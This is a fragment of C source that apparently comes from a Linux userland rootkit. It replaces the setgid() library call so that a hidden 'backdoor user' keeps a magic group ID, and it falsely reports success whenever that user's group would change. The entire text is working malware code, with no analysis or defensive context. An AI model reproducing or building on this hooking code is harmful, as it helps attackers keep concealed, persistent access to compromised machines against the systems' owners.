int setgid(gid_t gid)
{
    hook(CSETGID);
    if(is_bdusr())
    {
        if(gid != MAGIC_GID) (void)call(CSETGID, MAGIC_GID);
        return 0;
    }
    return (long)call(CSETGID, gid);
}
